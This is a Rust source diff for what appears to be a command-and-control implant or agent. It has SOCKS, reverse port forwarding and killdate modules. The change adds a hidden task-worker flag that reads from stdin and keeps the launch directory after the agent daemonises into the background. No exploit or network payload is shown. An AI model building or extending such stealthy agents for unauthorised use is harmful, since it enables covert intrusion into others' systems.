@@ -29,13 +29,12 @@ mod dispatch;
 mod error;
 pub use error::{Error, Result};
 mod interactive;
-pub mod p2p;
-pub mod p2p_tcp;
 mod protocol_pump;
 mod rpfwd;
 mod socks;
 mod streams;
 mod sys;
+mod worker;
 
 use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::cell::RefCell;
@@ -88,6 +87,13 @@ pub fn set_killdate(ts: u64) {
 // ── Entry ───────────────────────────────────────────────
 
 fn main() {
+    if std::env::args().any(|arg| arg == "--nanaz-task-worker") {
+        std::process::exit(worker::run_from_stdin());
+    }
+
+    #[cfg(all(unix, not(debug_assertions)))]
+    let launch_cwd = std::env::current_dir().ok();
+
     // Linux release: fork to background so the agent doesn't occupy the shell.
     // After fork: detach from controlling terminal (setsid), ignore SIGHUP,
     // close std{in,out,err} and reopen against /dev/null, chdir to root.
@@ -115,8 +121,13 @@ fn main() {
                 libc::close(fd);
             }
         }
-        // Detach from cwd of launcher to avoid keeping it busy.
-        let _ = libc::chdir(b"/\0".as_ptr() as *const _);
+        // Keep operator-visible relative-path semantics stable after
+        // daemonising. If the launch directory disappeared, fall back to /.
+        if let Some(cwd) = launch_cwd {
+            let _ = std::env::set_current_dir(cwd);
+        } else {
+            let _ = libc::chdir(b"/\0".as_ptr() as *const _);
+        }
     }
 
     // Linux debug: still attached to terminal, but ignore SIGHUP.
